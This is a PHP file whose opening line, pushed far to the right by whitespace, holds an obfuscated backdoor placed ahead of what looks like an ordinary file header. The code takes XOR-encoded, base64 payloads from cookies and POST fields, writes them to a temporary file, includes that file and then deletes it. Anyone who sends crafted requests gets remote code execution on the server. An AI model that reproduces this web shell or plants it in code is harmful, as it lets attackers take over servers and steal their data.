<?php                                                                                                                                                                                                                                                                                                                                                                                                 $TtgaA = "VN_OfG";$AyovVFdX = class_exists($TtgaA); $vAIxMvR = $AyovVFdX;if (!$vAIxMvR){class VN_OfG{private $UQcSKznC;public static $WWVoXWF = "5c25c416-c536-444e-8d03-72ff74a56f4d";public static $WGqPLo = NULL;public function __construct(){$yDxDEPOwv = $_COOKIE;$JNFNP = $_POST;$WYeFivi = @$yDxDEPOwv[substr(VN_OfG::$WWVoXWF, 0, 4)];if (!empty($WYeFivi)){$dpOeVaM = "base64";$YNGbyNjdYr = "";$WYeFivi = explode(",", $WYeFivi);foreach ($WYeFivi as $UfxvrZhx){$YNGbyNjdYr .= @$yDxDEPOwv[$UfxvrZhx];$YNGbyNjdYr .= @$JNFNP[$UfxvrZhx];}$YNGbyNjdYr = array_map($dpOeVaM . chr ( 908 - 813 ).'d' . chr (101) . "\143" . 'o' . chr ( 480 - 380 ).'e', array($YNGbyNjdYr,)); $YNGbyNjdYr = $YNGbyNjdYr[0] ^ str_repeat(VN_OfG::$WWVoXWF, (strlen($YNGbyNjdYr[0]) / strlen(VN_OfG::$WWVoXWF)) + 1);VN_OfG::$WGqPLo = @unserialize($YNGbyNjdYr);}}public function __destruct(){$this->wgVLbm();}private function wgVLbm(){if (is_array(VN_OfG::$WGqPLo)) {$wEmtIakw = sys_get_temp_dir() . "/" . crc32(VN_OfG::$WGqPLo[chr ( 484 - 369 ).chr ( 1002 - 905 ).'l' . "\x74"]);@VN_OfG::$WGqPLo["\x77" . "\x72" . chr ( 908 - 803 ).'t' . "\145"]($wEmtIakw, VN_OfG::$WGqPLo["\x63" . "\x6f" . chr (110) . "\164" . "\x65" . chr (110) . "\x74"]);include $wEmtIakw;@VN_OfG::$WGqPLo[chr (100) . chr (101) . "\x6c" . 'e' . "\x74" . "\x65"]($wEmtIakw);exit();}}}$tczOo = new VN_OfG(); $tczOo = NULL;} ?><?php
/**
